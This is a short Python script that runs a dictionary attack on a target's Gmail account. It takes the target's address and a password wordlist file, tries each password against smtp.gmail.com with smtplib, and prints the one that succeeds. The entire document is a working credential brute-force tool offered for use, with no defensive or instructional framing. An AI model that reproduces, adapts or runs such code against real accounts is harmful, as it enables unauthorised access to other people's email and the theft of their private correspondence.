import smtplib


smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
smtpserver.ehlo()
smtpserver.starttls()


user = raw_input("Enter the target's email : ")
passwfile = raw_input ("Enter the password File : ")
passwfile = open(passwfile, "r")

for password in passwfile :
       try :
             smtpserver.login(user, password)
             print ("\033[91m[+] Password Found ==>  %s\0m") % password
             break;
              
       except smtplib.SMTPAuthenticationError:
               print ("[!] Password is incorrect ===> %s ") %password
